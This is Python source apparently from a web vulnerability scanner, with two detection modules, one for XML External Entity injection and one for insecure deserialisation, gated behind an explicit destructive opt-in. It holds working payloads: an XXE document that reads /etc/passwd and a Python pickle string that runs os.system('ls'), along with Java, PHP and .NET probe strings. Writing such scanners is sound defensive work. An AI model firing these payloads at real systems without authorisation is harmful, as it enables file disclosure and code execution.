"""XML and deserialisation modules.

These are classified as destructive because a successful exploit can read
server files or trigger code execution, so they only run when the operator
explicitly opts in with --allow-destructive.
"""

from __future__ import annotations

from ...knowledge.signatures import XXE_SIGNATURES, match_signatures
from ...models import Category, Confidence, Finding, Severity
from ..base import ScanContext
from ..http_helper import HttpModule


class XmlExternalEntityModule(HttpModule):
    """Detect XML External Entity injection."""
    group = "injection"

    id = "xml_external_entity"
    name = "XML External Entity (XXE) Injection"
    description = (
        "Sends XML containing an external entity reference to endpoints that "
        "accept XML and reports when a local file is disclosed."
    )
    severity = Severity.CRITICAL
    confidence = Confidence.CONFIRMED
    category = Category.INJECTION
    cwe = "CWE-611"
    owasp = "A05"
    tags = ["xxe", "xml", "injection", "destructive"]
    remediation = (
        "Disable external entity resolution in the XML parser, and disable DTDs "
        "entirely where the format does not require them."
    )
    references = [
        "https://owasp.org/www-community/attacks/XML_External_Entity",
        "https://portswigger.net/web-security/xxe",
    ]
    max_params = 0

    _PAYLOAD = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
        "<root>&xxe;</root>"
    )

    async def run(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        targets = [
            e.url
            for e in ctx.endpoints
            if "xml" in e.content_type or e.url.lower().endswith(".xml")
        ]
        targets += [f.action for f in ctx.forms][:10]

        seen: set[str] = set()
        for url in targets:
            if url in seen or not ctx.scope.allows(url):
                continue
            seen.add(url)
            response = await ctx.client.post(
                url,
                content=self._PAYLOAD.encode(),
                headers={"Content-Type": "application/xml"},
            )
            if not response.ok:
                continue
            marker = "root:x:0:0"
            disclosed = marker.lower() in response.text.lower()
            signature_hit = bool(match_signatures(response.text, XXE_SIGNATURES))
            if not (disclosed or signature_hit):
                continue
            reason = (
                "the content of /etc/passwd appears in the response"
                if disclosed
                else "an XML entity-parsing error signature appeared in the response"
            )
            confidence = Confidence.CONFIRMED
            findings.append(
                self.finding(
                    title="XML external entity injection",
                    target=url,
                    description=(
                        f"{url} parses XML with external entity resolution enabled. "
                        f"{reason}. This permits reading local files and, in some "
                        "parsers, outbound requests from the server."
                    ),
                    confidence=confidence,
                    evidence_text=(
                        f"POST {url}\nContent-Type: application/xml\n"
                        f"Payload: {self._PAYLOAD}\n"
                        f"Response: {response.text[:800]}"
                    ),
                    matched="<!ENTITY xxe SYSTEM",
                )
            )
        return findings


class InsecureDeserializationModule(HttpModule):
    """Detect unsafe deserialisation of user-controlled input."""
    group = "injection"

    id = "insecure_deserialization"
    name = "Insecure Deserialization"
    description = (
        "Probes endpoints that accept structured objects for gadget-chain "
        "markers left by Java, Python, PHP or .NET deserialisers."
    )
    severity = Severity.CRITICAL
    confidence = Confidence.HIGH
    category = Category.INJECTION
    cwe = "CWE-502"
    owasp = "A08"
    tags = ["deserialization", "rce", "destructive"]
    remediation = (
        "Never deserialise untrusted data. Use a data-only format such as JSON, "
        "and apply strict type filters to any deserialisation that is required."
    )
    max_params = 12

    _PAYLOADS = [
        ("Java", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlQcm9yZXNpdHlMZWV0aG9k"),
        ("PHP", 'O:8:"stdClass":1:{s:4:"test";s:2:"hi";}'),
        ("Python", "cos\nsystem\n(S'ls')\ntR."),
        (".NET", "AAEAAAD/////wAAAAAAAA=="),
    ]

    async def run(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        targets = self.collect_targets(ctx)
        for target in targets:
            for language, payload in self._PAYLOADS:
                delta = await self.probe(ctx, target, payload)
                if not delta.has_behaviour_change:
                    continue
                if delta.status_delta == 0 and abs(delta.length_ratio - 1.0) < 0.2:
                    continue
                findings.append(
                    self.finding(
                        title=f"Possible {language} deserialisation in '{target.param}'",
                        target=target.url,
                        description=(
                            f"Parameter '{target.param}' on {target.url} changes the "
                            f"response when supplied with a {language} deserialisation "
                            "payload, which suggests user input reaches a native "
                            "deserialiser."
                        ),
                        confidence=Confidence.MEDIUM,
                        evidence_text=(
                            f"Baseline: {delta.baseline.summary()}\n"
                            f"Payload : {payload[:120]}\n"
                            f"Probe   : {delta.probe.summary()}"
                        ),
                        matched=payload[:120],
                        parameter=target.param,
                    )
                )
                break
            if len(findings) >= 10:
                break
        return findings
